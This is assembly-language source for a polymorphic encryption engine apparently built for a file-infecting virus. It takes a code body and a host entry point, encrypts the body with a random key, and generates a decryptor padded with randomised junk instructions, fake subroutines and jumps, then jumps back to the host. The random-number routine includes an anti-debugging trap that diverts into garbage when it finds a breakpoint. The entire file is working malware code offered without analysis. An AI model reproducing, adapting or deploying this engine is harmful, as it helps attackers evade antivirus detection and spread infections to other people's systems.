ofs equ offset
dwo equ dword ptr
wo equ word ptr
by equ byte ptr

polyengine equ this byte

MAX_RECURSION   = 3
JMP_MAX         = 16
MAX_SUBROUTINES = 8

;polymorphic encryptor engine

;ESI=Code to encript
;EDI=Place to put code
;ECX=Size of code to encript
;EAX=Delta entrypoint
;EDX=VA where code will run in host

;EDI=Final buffer
;ECX=Size
;EAX=New delta entrypoint

MAX_RECURSION   = 6
MAX_SUBROUTINES = 16
;JMP_MAX         = 16

flg    record{
       _key:1,                                 ;1key isnt necessary
       _bwd_fwd:1,                             ;0inc/1dec counter
       _direction:1,                           ;1backward/0forward
       _dword:1,                               ;1word/0dword
       _byte:1,                                ;1byte/0word-dword
       _encriptor:2                            ;XOR=00/NOT=01/ADD=10/SUB=11
       }

poly   proc
       push esi
       call delta
       mov [ebp+rva], edx
       mov [ebp+entry], eax
       mov [ebp+_size], ecx
       mov [ebp+buffer], edi
       sub eax, eax
       mov [ebp+reg32], eax
       mov [ebp+recurse], eax  ;init internal vars
       mov [ebp+lparm], eax
       mov [ebp+lvars], eax
       mov [ebp+subs_index], eax
       mov dwo [ebp+s_into], eax   ;(dword)
       call random0
       and eax, mask _bwd_fwd + mask _direction + mask _encriptor + \
                mask _dword + mask _byte
       mov [ebp+flagz], eax    ;set engine flagz
       mov edx, eax
       and edx, mask _encriptor
       call random0
       mov [ebp+key], eax       ;choose key
       push edi
       lea edi, [ebp+(encbuffer)]
       mov eax, 90909090h
       stosd
       stosd
       stosd
       stosd
       cmp dl, 01b
       jne @@no_not
       or dwo [ebp+flagz], mask _key
       mov ax, 010f6h
       mov dx, 0d0f6h
       jmp @@b_w_dw
  @@no_not:
       cmp dl, 00b
       jne @@no_xor
       mov ax, 03080h
       mov dx, 00034h
       jmp @@b_w_dw
  @@no_xor:
       cmp dl, 10b
       jne @@no_add
       mov ax, 00080h
       mov dx, 0002ch
       jmp @@b_w_dw
  @@no_add:
       mov ax, 02880h
       mov dx, 00004h
  @@b_w_dw:
       test dwo [ebp+flagz], mask _byte
       jnz @@byte
       test dwo [ebp+flagz], mask _dword
       jz @@dword
  @@word:
       inc al
       inc dl
       inc ecx
       shr ecx, 1
       inc dwo [ebp+_size]
       and dwo [ebp+_size], not 1
       jmp @@encloop
  @@dword:
       inc al
       inc dl
       add ecx,3
       shr ecx, 2
       add dwo [ebp+_size], 3
       and dwo [ebp+_size], not 3
       jmp @@encloop
  @@byte:
       and dwo [ebp+flagz], not mask _dword
  @@encloop:
       sub edi, 4*4
       mov [ebp+counterloops], ecx    ;save entry values
       mov [ebp+_dec], ax
       mov ax, 1234h
     org $-2
       nop
       lodsb
       mov bx, 1234h
     org $-2
       nop
       stosb
       test dwo [ebp+flagz], mask _byte
       jnz @@nop
       inc ah
       inc bh
       test dwo [ebp+flagz], mask _dword
       jz @@nop
       mov al, 66h
       mov bl, 66h
  @@nop:
       stosw
       test dwo [ebp+flagz], mask _dword
       jz @@no_prefix
       mov al, 66h
       stosb
  @@no_prefix:
       mov ax, dx
       cmp dh, 0
       jz @@opc1
       stosw
       mov al, 12h
     org $-1
  @@opc1:
       stosb
       test dwo [ebp+flagz], mask _key
       jnz @@stos
       mov eax, [ebp+key]
       test dwo [ebp+flagz], mask _byte
       jnz @@byte111
       test dwo [ebp+flagz], mask _dword
       jz @@dwo
       db 066h
  @@dwo:
       stosd
       mov al, 12
     org $-1
  @@byte111:
       stosb
  @@stos:
       mov eax, ebx
       stosw
       pop edi
       call encbuffer
       call set_write_buffer
       mov [ebp+decriptor], edi;here the decriptor start
       call garble
       call garble
       call garble                             ;start of decriptor
       call garble
       call garble
       lea ebx, [ebp+(make_counter)]
       lea edx, [ebp+(make_pointer)]
       call swapper                            ;setup start of poly decriptor
       push edi                                ;loop start here
       call garble
       test dwo [ebp+flagz], mask _dword
       jz @@no_prefix11
       mov al, 66h
       stosb
  @@no_prefix11:
       mov eax, dwo [ebp+_dec]
       mov edx, [ebp+p_reg]
       or ah, dl
       stosw                                   ;store crypt instr
       test dwo [ebp+flagz], mask _key
       jnz @@4
       mov eax, [ebp+key]
       test dwo [ebp+flagz], mask _byte
       jnz @@byte11122
       test dwo [ebp+flagz], mask _dword
       jz @@dwo111
       db 066h
  @@dwo111:
       stosd
       mov al, 12
     org $-1
  @@byte11122:
       stosb
  @@4:
       call garble
       lea ebx, [ebp+(upd_counter)]
       lea edx, [ebp+(upd_pointer)]
       call swapper                            ;update counter and pointer
       mov edx, [ebp+c_reg]
       call random
       jc @@5
       call random
       js @@7
       mov eax, 0c00bh                         ;or reg, reg
       jmp @@8
  @@7:
       mov eax, 0c085h                         ;test reg, reg
  @@8:
       mov ecx, edx
       shl edx, 3
       or ah, dl
       or ah, cl
       stosw
       jmp @@6
  @@5:
       mov eax, 0f883h
       or ah, dl
       stosw                                   ;cmp reg, 0
       sub eax, eax
       stosb
  @@6:
       mov ax, 850fh                           ;do conditional jump
       stosw
       pop edx
       sub edx, edi                            ;delta distance
       sub edx, 4
       mov eax, edx
       stosd                                   ;jnz start_of_loop
       mov dwo [ebp+reg32], 0
       call garble
       mov al, 0e9h
       stosb                                   ;jmp start
       mov eax, edi
       sub eax, [ebp+buffer]
       sub eax, [ebp+entry]
       add eax, 4
       neg eax
       stosd
       call garble
       call garble
       mov ecx, [ebp+buffer]   ;(this allow the calls be
       sub edi, ecx                            ;forward/backward direction)
       xchg edi, ecx
       mov eax, [ebp+decriptor];calculate new entrypoint
       sub eax, [ebp+buffer]   ;relative to previous rva
       pop esi
       ret
poly   endp

gar    proc
       call random0                            ;get any reg
       and eax, 0111b
       cmp al, 4                               ;esp never
       je gar
       ret
gar    endp

get8free proc
       mov eax, [ebp+reg32]
       and eax, 01111b
       cmp eax, 01111b
       jne @@1
       stc
       ret
  @@1:
       call random0
       and eax, 011b
       bt [ebp+reg32], eax     ;al,cl,dl,bl
       jc get8free
       call random_f
       jc @@2
       or al, 0100b                            ;ah,ch,dh,bh
  @@2:
       ret
get8free endp

get32reg proc                                  ;get a free 32bit reg
       call gar                                ;and mark it as used
       bts [ebp+reg32], eax
       jc get32reg
       ret
get32reg endp

get32free proc                                 ;get a free 32bit reg
       call gar                                ;and NOT mark it as used
       bt [ebp+reg32], eax
       jc get32free
       ret
get32free endp

swapper proc
       call random0
       jc @@1
       xchg edx, ebx                           ;change order
  @@1:
       push edx
       call ebx                                ;call 1th
       call garble
       pop edx
       call edx                                ;call 2th
       call garble
       ret
swapper endp

make_counter proc
       call get32reg
       mov [ebp+c_reg], eax
       cmp al, 5                               ;ebp complicate methodz
       jne @@2
       btr [ebp+reg32], eax    ;free ebp
       jmp make_counter
  @@2:
       or al, 0b8h
       stosb
       mov eax, [ebp+counterloops]
       inc eax
       test dwo [ebp+flagz], mask _bwd_fwd
       jnz @@1
       neg eax                                 ;counter will be INCed
  @@1:
       stosd
       ret
make_counter endp

make_pointer proc
       call get32reg
       cmp al, 5                               ;ebp complicate methodz
       jne @@1
       btr [ebp+reg32], eax    ;free ebp
       jmp make_pointer
  @@1:
       mov [ebp+p_reg], eax
       or al, 0b8h
       stosb
       mov eax, [ebp+rva]
       test dwo [ebp+flagz], mask _direction
       jz @@2
       add eax, dwo [ebp+_size];pointer will be DECced
  @@2:
       stosd
       ret
make_pointer endp

upd_pointer:
       mov bh, 1
       test dwo [ebp+flagz], mask _byte
       jnz @@byte11122
       inc bh
       test dwo [ebp+flagz], mask _dword
       jnz @@byte11122
       add bh, bh
  @@byte11122:
       mov eax, [ebp+p_reg]
       test dwo [ebp+flagz], mask _direction
       jmp _update_reg

upd_counter:
       mov eax, [ebp+c_reg]
       test dwo [ebp+flagz], mask _bwd_fwd
       mov bh, 01

_update_reg proc                               ;z=inc/nz=dec
       mov bl, 40h
       mov edx, 0c083h                         ;add
       jz @@0
       xor edx, 0c083h xor 0e883h              ;sub
       mov bl, 48h                             ;dec
  @@0:
       push eax
       mov eax, 3
       call random
       or eax, eax
       jz @@2                                  ;choose method
       dec eax
       jz @@1
       xor edx, 0c083h xor 0e883h              ;sub<->add
       neg bh                                  ;neg(1)
  @@1:
       pop ecx
       mov eax, edx
       or ah, cl                               ;patch reg
       stosw
       movzx eax, bh                           ;signal
       jmp @@3
  @@2:
       pop ecx
       xchg eax, ebx
       or al, cl                               ;patch reg
       movzx ecx, ah
       dec ecx
       jecxz @@3                ;1
       stosb
       dec ecx
       jecxz @@3                ;2
       stosb
       dec ecx
       jecxz @@3                ;3
       stosb                    ;4
  @@3:
       stosb
       ret
_update_reg endp

garble proc
       pushad
       inc by [ebp+recurse]
       cmp by [ebp+recurse], MAX_RECURSION
       jae @@1
       mov eax, 8
       call random
       add eax, 4
       mov ecx, eax                            ;4-11 instructionz
  @@0:
       push ecx
       lea esi, [ebp+(gtable)]
       mov eax, (ofs egtable - ofs gtable)/4
       call random
       shl eax, 2
       add esi, eax
       lodsd
       add eax, ebp
       cmp by [ebp+lgarble], al
       je @@2                                  ;same?
       mov by [ebp+lgarble], al
       call eax
  @@2:
       pop ecx
       loop @@0
  @@1:
       dec by [ebp+recurse]
       mov [esp], edi                          ;copy of edi in stack
       popad
       ret
garble endp

make_subs proc
       cmp dwo [ebp+subs_index], MAX_SUBROUTINES
       ja @@1
       cmp by [ebp+s_into], 0
       jne @@1
       inc by [ebp+s_into]      ;mark into

       mov eax, [ebp+subs_index]
       inc dwo [ebp+subs_index]
       mov ecx, eax
       shl ecx, 1               ;*2
       shl eax, 2               ;*4
       add eax, ecx             ;=*6
       lea esi, [ebp+eax+ofs subs_table]
       mov al, 0e9h
       stosb
       stosd
       push edi                                ;[esp]-4 = skip_jmp
       call garble
       mov [esi], edi                          ;where sub is
       mov eax, 5
       call random                             ;number of paramz pushed
       mov [esi.4], al                         ;by caller
       mov eax, 5
       call random                             ;number of local variables
       mov [esi.5], al
       test eax, eax                           ;if not local variables, then
       jz @@0                                  ;dont alloc stack
       mov ebx, eax
       shl ebx, 2                              ;displacement in dwords
       mov al, 0c8h
       stosb                                   ;enter
       mov eax, ebx
       stosd                                   ;size/deep
       dec edi
       jmp @@2
  @@0:
       mov al, 55h
       stosb                                   ;push ebp
       mov ax, 0ec8bh
       stosw                                   ;mov ebp, esp
  @@2:
       push dwo [ebp+reg32]    ;save reg state
       mov by [ebp+_pusha], 0  ;no use pusha at start
       mov eax, 3
       call random
       test eax, eax
       je @@4                                  ;will use PUSHA!
  @@10:
       call random0                            ;choose regs
       and eax, 11111111b
       or eax,  00110000b                      ;set EBP and ESP too
       cmp al, -1
       jz @@10
       mov [ebp+reg32], eax
       not al                                  ;free regs are set bits now!
       and eax, 11001111b
       test eax, eax
       jz @@10
  @@5:
       bsf edx, eax
       jz @@6                                  ;no more regs free?
       btc eax, edx                            ;clear it
       push eax
       lea eax, [edx+50h]
       stosb                                   ;store as PUSH
       pop eax
       jmp @@5
  @@4:
       mov by [ebp+_pusha], -1 ;pusha used!
       mov dwo [ebp+reg32], 00110000b
       mov al, 60h                             ;set EBP and ESP as used
       stosb                                   ;pusha
  @@6:
       movzx eax, by [esi.4]
       mov [ebp+lparm], eax
       movzx eax, by [esi.5]
       mov [ebp+lvars], eax    ;set paramz to mem write/read
       call garble
       call garble
       call garble
       xor eax, eax
       mov [ebp+lparm], eax    ;disable mem write/read
       mov [ebp+lvars], eax
       mov al, [ebp+_pusha]
       inc al
       jnz @@7                                 ;well, do individual POPs
       mov al, 61h
       stosb                                   ;POPA
       jmp @@8
  @@7:
       mov eax, [ebp+reg32]
       not al                                  ;free regs are set bits now!
       and eax, 11001111b
  @@9:
       bsr edx, eax
       jz @@8                                  ;no more regs free?
       btc eax, edx                            ;clear it
       push eax
       lea eax, [edx+58h]
       stosb                                   ;store as POP this time
       pop eax
       jmp @@9
  @@8:
       pop dwo [ebp+reg32]     ;restore reg state
  @@3:
       mov al, 0c9h
       stosb                                   ;leave
       mov al, 0c2h
       stosb                                   ;ret
       movzx eax, by [esi.4]
       shl eax, 2
       test eax, eax
       jz @@a
       stosw                                   ;clean params
       jmp @@b
  @@a:
       inc by [edi-1]                          ;no paramz, use RETN
  @@b:
       call garble
       pop esi
       mov ecx, edi
       sub ecx, esi                            ;distance
       mov [esi-4], ecx                        ;patch jmp
       dec by [ebp+s_into]
  @@1:
       ret
make_subs endp

make_call proc
       cmp by [ebp+s_into], 0
       jne @@1                                 ;cant call while creating sub
       mov eax, [ebp+subs_index]
       test eax, eax
       jz @@1
       call random                             ;choose one of the subs ready
       mov ecx, eax
       shl ecx, 1
       shl eax, 2
       add eax, ecx
       lea esi, [ebp+eax+ofs subs_table]
       movzx ecx, by [esi.4]
       jecxz @@2                               ;how much paramz it need?
  @@3:
       call gar
       or al, 50h                              ;push paramz
       stosb
       loop @@3
  @@2:
       mov al, 0e8h
       stosb                                   ;build call
       stosd                                   ;store displacement
       mov eax, dwo [esi]
       sub eax, edi
       mov [edi-4], eax
  @@1:
       ret
make_call endp

lea_dword proc
       mov al, 8dh
       stosb
       call get32free
       shl eax, 3
       push eax
       call gar
       pop edx
       or eax, edx
       or al, 80h
  __sto_b_dd:
       stosb
       call random0
       stosd
       ret
lea_dword endp

math_byte proc
       mov eax, 8
       call random
       shl eax, 3
       or eax, 1000000011000000b               ;make math operation
       push eax
       call get8free
       pop edx
       jc @@1
       or eax, edx
       xchg al, ah
       stosw
       call random0
       stosb                                   ;byte
  @@1:
       ret
math_byte endp

math_word proc
       mov ax, 8166h
       stosw
       call _math_imm
       stosw
       ret
math_word endp

math_dword proc
       mov al, 81h
       stosb
       call _math_imm
       stosd
       ret
math_dword endp

_math_imm proc
       mov eax, 8
       call random
       shl eax, 3
       or al, 11000000b
       push eax
       call get32free
       pop edx
       or eax, edx                             ;patch reg into
       stosb
       call random0
       ret
_math_imm endp

push_pop proc
       call gar
       or al, 50h
       stosb
  __do_pop:
       call garble                             ;recurse into
       call get32free
       or al, 58h
       stosb
       ret
push_pop endp

jmpcn  proc
       mov eax, 0fh
       call random
       or ax, 0f80h                            ;jcc near
       xchg al, ah
       stosw
       stosd
       push edi
       call garble                             ;recurse
       pop esi
       mov eax, edi
       sub eax, esi
       mov dwo [esi-4], eax                    ;fix jcc
       ret
jmpcn  endp

jmpcs  proc
       mov eax, 0fh
       call random
       or al, 70h                              ;make jmp conditional
       stosw
       push edi
       call garble                             ;recurse
       pop esi
       push edi
       mov eax, esi
       xchg eax, edi
       sub eax, edi
       mov by [esi-1], al                      ;fix jcc
       movsx ecx,al
       cmp eax,ecx
       je @@1                                 ;jmp destiny too far?
       mov edi, esi
       dec edi
       dec edi
       call one_byte                           ;replace with 2 byte instr
       call one_byte
 @@1:
       pop edi
       ret
jmpcs  endp

;jmpn   proc
;       mov al, 0e9h
;       stosb
;       mov eax, JMP_MAX
;       call random
;       inc eax
;       mov ecx, eax
;       stosd
;       jmp _shit
;jmpn   endp

;jmps   proc
;       mov eax, JMP_MAX
;       call random
;       inc eax
;       mov ecx, eax
;       mov ah, 0ebh
;       xchg al, ah
;       stosw
;       movzx eax, ah
 _shit:
       call random0                           ;ecx bytes of shit
       stosb
       loop _shit
       ret
;jmps   endp

movr_byte proc
       call gar
       push eax
       call get8free
       jnc @@1
       pop eax
       ret
  @@1:
       push eax
       mov al, 08ah
       jmp _reg_reg
movr_byte endp

movr_word proc
       mov al, 66h                             ;word-size prefix
       stosb
movr_word endp

movr_dword proc
       call gar
       push eax
       call get32free
       push eax
       mov al, 08bh
  _reg_reg:
       stosb
       pop eax                                 ;destino
       pop edx                                 ;source
       shl eax, 3
       or eax, edx
       or eax, 11000000b
       stosb
       ret
movr_dword endp

mov_dword proc
       call get32free
       or al, 0b8h
       jmp __sto_b_dd
mov_dword endp

mov_word proc
       mov al, 66h
       stosb
       call get32free
       or al, 0b8h
       stosb
       call random0
       stosw
       ret
mov_word endp

mov_byte proc
       call get8free
       jc @@1
       or al, 0b0h
       stosb
       call random0
       stosb
  @@1:
       ret
mov_byte endp

one_byte proc
       mov eax, 5
       call random
       lea ebx, [ebp+(ofs one_byte_table)]
       xlat
       stosb
       ret
one_byte endp

inc_dec proc
       call get32free
       add al, 40h
       call random_f
       js @@1
       or al, 01000b                           ;inc/dec
  @@1:
       stosb
       ret
inc_dec endp

mov_zs_x proc
       call random0
       mov eax, 0b60fh
       js @@1
       mov ah, 0beh                            ;z/s
  @@1:
       adc ah, 0                               ;16/8
       stosw
       call gar
       push eax
       call get32free
       shl eax, 3
       pop edx
       or eax, edx
       or al, 0c0h
       stosb
       ret
mov_zs_x endp

push_mem_pop proc
       mov ax, 035ffh
       stosw
       call __build_mem
       jmp __do_pop
push_mem_pop endp

mov_mem proc
       mov al, 08bh
       stosb
       call get32free
       jmp __build_reg
mov_mem endp

oper_mem proc
       mov ecx, 02b8b0333h
       call __choose_opcode
       call get32free
       jmp __build_reg
oper_mem endp

cmp_test_mem proc
       mov ecx, 085393b85h
       call __choose_opcode
       call gar
;       jmp __build_reg
cmp_test_mem endp

  __build_reg:
       shl eax, 3
       or al, 0101b
       stosb
  __build_mem:
       mov eax,[ebp+_size]
       call random
       add eax,[ebp+rva]
       stosd
       ret

  __choose_opcode:
       mov eax, 4
       call random
       xchg eax,ecx
       jecxz @@skip
  @@shift:
       ror eax,8
       loop @@shift
  @@skip:
       stosb
       ret

mov_write proc
       mov al, 89h
       stosb
       call gar
       test al,al
       jnz __adjust_reg
       mov by [edi-1],0a3h
       jmp __mem_write
  __adjust_reg:
       shl eax, 3
       or al, 0101b
       stosb
  __mem_write:
       mov eax,[ebp+w_size]
       call random
       add eax,[ebp+rva]
       add eax,[ebp+w_buffer]
       stosd
       ret
mov_write endp

mem_write proc
       mov ecx,029013189h
       call __choose_opcode
  __adjust_reg2:
       call gar
       jmp __adjust_reg
mem_write endp

mem_write2 proc
       mov ecx,011191d15h
       call __choose_opcode
       cmp al, 15h
       je @@is_NOT
       cmp al, 1dh
       jne __adjust_reg2
  @@is_NOT:
       stosb
       mov by [edi-2],0f7h
       jmp __mem_write
mem_write2 endp

random_f proc
       push eax
       call random0
       pop eax
       ret
random_f endp

random0 proc
       sub eax, eax
random proc
       push ecx edx
       push eax
       call delta
       mov eax, [ebp+pseed]
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       mov [ebp+pseed], eax
       pop ecx
       jecxz @@3                               ;limit set?
       sub edx, edx
       div ecx
       xchg eax, edx                           ;value = rnd MOD limit
  @@3:
       mov ecx, [esp+(2*4)]                    ;ecx=ret address
       cmp by [ecx], 0cch                      ;is ret address a int3?
       jne @@4
       jmp ebp                                 ;if so, start to exec garbage
  @@4:
       pop edx ecx
       sahf                                    ;random flagz
       ret
random endp
random0 endp

set_write_buffer proc
       mov eax, 128
       call random
       add eax,4*10
       mov [ebp+w_size],eax
       lea ecx, [eax+4]
       mov eax,edi
       sub eax,[ebp+buffer]
       mov [ebp+w_buffer], eax
       call _shit
       ret
set_write_buffer endp

jmp_over_write_buffer proc
       call random_f
       jc @@skip
       jnz @@skip
       jp @@skip
       mov al, 0e9h
       stosb
       stosd
       push edi
       call set_write_buffer
       pop eax
       mov ecx,edi
       sub ecx,eax
       mov [eax-4],ecx
  @@skip:
       ret
jmp_over_write_buffer endp

imul_rr proc
       mov al, 69h
       stosb
       call get32free
       mov cl, al
       shl cl, 3
       call gar
       or al,cl
       or al,0c0h
       jmp __sto_b_dd
imul_rr endp

delta  proc
       call @@delta
  @@delta:
       pop ebp
       sub ebp, ofs @@delta
       ret
delta  endp

gtable equ $
       dd ofs imul_rr

       dd ofs jmp_over_write_buffer

       dd ofs mem_write
       dd ofs mem_write
       dd ofs mem_write
       dd ofs mem_write
       dd ofs mem_write
       dd ofs mem_write

       dd ofs mem_write2
       dd ofs mem_write2
       dd ofs mem_write2
       dd ofs mem_write2

       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write
       dd ofs mov_write

       dd ofs cmp_test_mem
       dd ofs cmp_test_mem
       dd ofs cmp_test_mem
       dd ofs cmp_test_mem

       dd ofs inc_dec
       dd ofs inc_dec

       dd ofs jmpcn
       dd ofs jmpcs

       dd ofs lea_dword
       dd ofs lea_dword

       dd ofs make_call
       dd ofs make_call
       dd ofs make_call
       dd ofs make_call

       dd ofs make_subs

       dd ofs math_byte
       dd ofs math_byte
       dd ofs math_byte

       dd ofs math_dword
       dd ofs math_dword
       dd ofs math_dword
       dd ofs math_dword
       dd ofs math_dword
       dd ofs math_dword

       dd ofs math_word
       dd ofs math_word

       dd ofs movr_byte
       dd ofs movr_byte
       dd ofs movr_byte

       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword
       dd ofs movr_dword

       dd ofs movr_word
       dd ofs movr_word

       dd ofs mov_byte
       dd ofs mov_byte
       dd ofs mov_byte

       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword
       dd ofs mov_dword

       dd ofs mov_word
       dd ofs mov_word

       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem
       dd ofs mov_mem

       dd ofs mov_zs_x
       dd ofs mov_zs_x

       dd ofs one_byte

       dd ofs oper_mem
       dd ofs oper_mem
       dd ofs oper_mem
       dd ofs oper_mem

       dd ofs push_mem_pop
       dd ofs push_mem_pop
       dd ofs push_mem_pop
       dd ofs push_mem_pop

       dd ofs push_pop
       dd ofs push_pop
       dd ofs push_pop
       dd ofs push_pop

;       dd ofs jmpn
;       dd ofs jmps
egtable equ $

one_byte_table equ $
       std
       clc
       cmc
       cld
       std

encbuffer:
       db 10h dup (90h)
       loop encbuffer
       ret

reg32        dd ?
buffer       dd ?
_size        dd ?
counterloops dd ?
entry        dd ?
rva          dd ?
flagz     dd ?
c_reg     dd ?
p_reg     dd ?
recurse   dd ?
decriptor dd ?
key        dd ?
lparm      dd ?
lvars      dd ?
subs_index dd ?
s_into     db ?
_pusha     db ?
lgarble    db ?
_dec       dw ?
subs_table db 6*(MAX_SUBROUTINES+1) dup (?)
pseed      dd ?
w_size     dd ?
w_buffer   dd ?


polyengine_end  equ this byte
polyengine_size equ (polyengine_end-polyengine)
